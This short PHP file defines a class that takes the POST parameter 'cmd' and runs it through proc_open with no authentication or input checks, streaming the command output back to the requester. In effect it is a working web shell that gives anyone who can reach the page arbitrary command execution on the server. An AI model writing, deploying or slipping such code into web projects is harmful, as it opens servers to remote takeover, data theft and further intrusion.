<?php
	class CommandExecution {
		function execute($cmd) {

		    $cmd .= " 2>&1";

			$descriptorspec = array(
			   0 => array("pipe", "r"),   // stdin is a pipe that the child will read from
			   1 => array("pipe", "w"),   // stdout is a pipe that the child will write to
			   2 => array("pipe", "w")    // stderr is a pipe that the child will write to
			);

			flush();
            $process = proc_open($cmd, $descriptorspec, $pipes, realpath('./'), array());
			//echo "<pre>";
			if (is_resource($process)) {
			    while ($s = fgets($pipes[1])) {
			        if (!is_null($s)) {
                        $a = preg_replace("/\r+/", "\r", str_replace("\n", "\r\n", $s));
                        print $a;
                    };

                    flush();
    				ob_flush();
			    }
			}
			//echo "</pre>";
		}
	}

	if (isset($_POST['cmd'])) {
		$commandExecution = new CommandExecution();
		$commandExecution->execute($_POST['cmd']);
	}

?>